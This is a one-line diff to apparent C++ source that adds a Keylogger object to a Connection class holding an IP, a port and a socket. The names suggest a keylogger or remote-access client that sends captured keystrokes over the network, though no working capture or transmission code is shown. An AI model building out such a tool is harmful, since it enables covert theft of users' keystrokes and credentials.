@@ -44,7 +44,7 @@ class Connection {
     string ip;
     int port;
     SOCKET sock;
-
+    Keylogger *keylogger = new Keylogger();
 
 public:
     //Initialize ip and string
